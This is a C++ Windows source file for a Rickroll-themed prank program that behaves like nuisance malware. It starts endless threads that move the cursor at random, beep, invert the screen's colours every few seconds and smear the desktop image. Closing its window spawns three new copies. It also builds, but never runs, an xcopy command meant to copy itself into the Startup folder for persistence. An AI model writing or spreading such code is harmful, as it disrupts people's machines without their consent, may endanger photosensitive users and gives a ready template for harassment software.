#include <windows.h>
#include <iostream>
#include <ctime>
#include <string>
#include <thread>
#include <future>

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
HANDLE hMutex, rMutex;

void CreateNewSubInstance(const char* lyrics);
void CreateNewInstance(const char* lyrics);
void RunCursorMover();
void RunBeepGenerator();
void RunFlashingGenerator();
void RunTunnelEffect();

void BeepGeneratorThread() {
    RunBeepGenerator();
}

void CursorMoverThread() {
    RunCursorMover();
}

void FlashingScreenThread(){
    RunFlashingGenerator();
}

void FlashingEffectThread(){
    rMutex = CreateMutex(NULL, TRUE, "FlashEffect");

    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(rMutex);
        return;
    }
    while(true){
        RunFlashingGenerator();
    }
    ReleaseMutex(rMutex);
}

void TunnelEffectThread(){
    hMutex = CreateMutex(NULL, TRUE, "TunnelEffect");

    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(hMutex);
        return;
    }
    while(true){
        RunTunnelEffect();
    }
    ReleaseMutex(hMutex);
}




int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    std::thread tunnelingThread(TunnelEffectThread);
    // Create futures to run BeepGenerator and CursorMover asynchronously
    auto beepFuture = std::async(std::launch::async, BeepGeneratorThread);
    auto cursorFuture = std::async(std::launch::async, CursorMoverThread);
    auto flashFuture = std::async(std::launch::async, FlashingScreenThread);


    const char* className = "MyWindowClass";
    const char* subClassName = "MySubWindowClass";
    const char* windowTitle = "NVM";

    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    const char* sFolderPath = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

    char command[MAX_PATH];
    snprintf(command, MAX_PATH, "xcopy \"%s\" \"%s\" /I", path , sFolderPath);

    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0, className, windowTitle,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 200,
        NULL, NULL, hInstance, NULL
    );
    
    if (hwnd != NULL) {
        
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        srand(static_cast<unsigned>(time(nullptr)));

        int randomX = rand() % screenWidth;
        int randomY = rand() % screenHeight;
        HWND test = FindWindow(NULL,"NVM");
        SetWindowPos(test, NULL, randomX, randomY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

        
    }
    else
    {
        MessageBox(NULL, "Window creation failed!", "Error", MB_ICONERROR);
        return 1;
    }

    HMENU hMenu = CreateMenu();
    HMENU hSongMenu = CreateMenu();

    AppendMenu(hSongMenu, MF_STRING, 1, "Never gonna give you up");
    AppendMenu(hSongMenu, MF_STRING, 2, "Never gonna let you down");
    AppendMenu(hSongMenu, MF_STRING, 3, "Never gonna run around and desert you");
    AppendMenu(hSongMenu, MF_STRING, 4, "Never gonna make you cry");
    AppendMenu(hSongMenu, MF_STRING, 5, "Never gonna say goodbye");
    AppendMenu(hSongMenu, MF_STRING, 6, "Never gonna tell a lie and hurt you");



    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hSongMenu, "NEVER GONNA GIVE YOU UP");

    SetMenu(hwnd, hMenu);

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }




    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static const char* subClassName = "MySubWindowClass";

    switch (msg) {
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case 1:
                    CreateNewSubInstance("Never gonna give you up!");
                    break;
                case 2:
                    CreateNewSubInstance("Never gonna let you down!");
                    break;
                case 3:
                    CreateNewSubInstance("Never gonna run around and desert you!");
                    break;
                case 4:
                    CreateNewSubInstance("Never gonna make you cry!");
                    break;
                case 5:
                    CreateNewSubInstance("Never gonna say goodbye!");
                    break;
                case 6:
                    CreateNewSubInstance("Never gonna tell a lie and hurt you!");
                    break;

            }
            break;
        case WM_CLOSE:
            CreateNewInstance("Never gonna give you up!");
            Sleep(1000);
            CreateNewInstance("Never gonna give you up!");
            Sleep(500);
            CreateNewInstance("Never gonna give you up!");
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return 0;
}

void CreateNewInstance(const char* lyrics) {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};

    if (CreateProcess(exePath, (LPSTR)lyrics, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

LRESULT CALLBACK SubWndProc(HWND subHwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        // Handle messages for the sub-window here.
        default:
            return DefWindowProc(subHwnd, msg, wParam, lParam);
    }
}

void CreateNewSubInstance(const char* title) {
    const char* randomTexts[] = {
        "Rickrolling is an internet meme involving tricking someone into clicking a hyperlink that leads to Rick Astley's 'Never Gonna Give You Up' music video.",
        "The term 'Rickroll' combines Rick Astley's name with a bait-and-switch concept.",
        "It originated on 4chan in 2007 as a prank redirecting users to the music video.",
        "In 2008, Rick Astley won an MTV Europe Music Award due to the Rickroll phenomenon.",
        "A Guinness World Record for the largest Rickroll event was set in Times Square in 2009.",
        "Rick Astley has embraced the meme and performed 'Never Gonna Give You Up' at various events.",
        "Rickrolls have evolved into various creative forms, such as text and QR codes.",
        "The essence of a Rickroll is surprising victims with misleading content.",
        "Rickrolling has become a global internet sensation, adapting to different languages.",
        "It's made appearances in TV shows, movies, and video games, cementing its pop culture status.",
        "Rickrolling has remained popular for over a decade, showcasing the longevity of internet memes.",
        "It's a lighthearted and harmless prank that has left a unique cultural mark online.",
        "Some notable figures and organizations have fallen victim to Rickrolls, including the White House and major corporations.",
        "A QR code that led to the Rick Astley video was even printed on Swedish currency in a playful nod to the meme.",
        "Rickrolling has been used for charity events and fundraisers, showing its versatility for a good cause.",
        "It has inspired various cover versions and remixes of 'Never Gonna Give You Up' by fans and artists.",
        "Rickrolling continues to be a source of amusement and surprise on the internet, with new variations and adaptations."
    };

    srand(static_cast<unsigned>(time(0)));

    int randomIndex = rand() % (sizeof(randomTexts) / sizeof(randomTexts[0]));
    const char* selectedText = randomTexts[randomIndex];

    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    WNDCLASS subWc = {};
    subWc.lpfnWndProc = SubWndProc; // Set the window procedure
    subWc.hInstance = GetModuleHandle(NULL);
    subWc.lpszClassName = "SubWindowClass";

    RegisterClass(&subWc);

    // Create the sub-window
    HWND subHwnd = CreateWindowEx(
        0, "SubWindowClass", title, WS_OVERLAPPEDWINDOW,
        (rand() % GetSystemMetrics(SM_CXSCREEN)), (rand() % GetSystemMetrics(SM_CYSCREEN)), 400, 200,
        nullptr, nullptr, subWc.hInstance, nullptr
    );

    if (subHwnd == NULL) {
        MessageBox(NULL, "SubWindow creation failed!", "Error", MB_ICONERROR);
        return;
    }

    HWND textHwnd = CreateWindowEx(
        0, "EDIT", selectedText, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | ES_READONLY,
        10, 10, 360, 140, subHwnd, NULL, NULL, NULL
    );

    ShowWindow(subHwnd, SW_SHOW);
    UpdateWindow(subHwnd);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void RunCursorMover() {
    FreeConsole();
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int regionWidth = screenWidth * 0.8;
    int regionHeight = screenHeight * 0.8;
    srand(static_cast<unsigned>(time(nullptr)));

    while (true) {
        int randomX = rand() % regionWidth;
        int randomY = rand() % regionHeight;
        SetCursorPos(randomX, randomY);
        Sleep(10000);
    }
}



void RunBeepGenerator() {
    FreeConsole();
    srand(static_cast<unsigned>(time(nullptr)));

    while (true) {
        int frequency = 750 + rand() % 751;
        int duration = 200 + rand() % 561;
        Beep(frequency, duration);
        int sleepDuration = 5000 + rand() % 5750;
        Sleep(sleepDuration);
    }
}

void RunFlashingGenerator() {
    FreeConsole();
    HDC hdc = GetDC(GetDesktopWindow());
    int screenWidth2 = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight2 = GetSystemMetrics(SM_CYSCREEN);
    while(true) {
    PatBlt(hdc, 0, 0, screenWidth2, screenHeight2, PATINVERT);
    Sleep(3500);
    }

}

void RunTunnelEffect(){
    FreeConsole();
    HDC hdc = GetDC(GetDesktopWindow());
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    while(true){
    StretchBlt(hdc, 25, 25, screenWidth , screenHeight , hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
    Sleep(2500);
    }

}


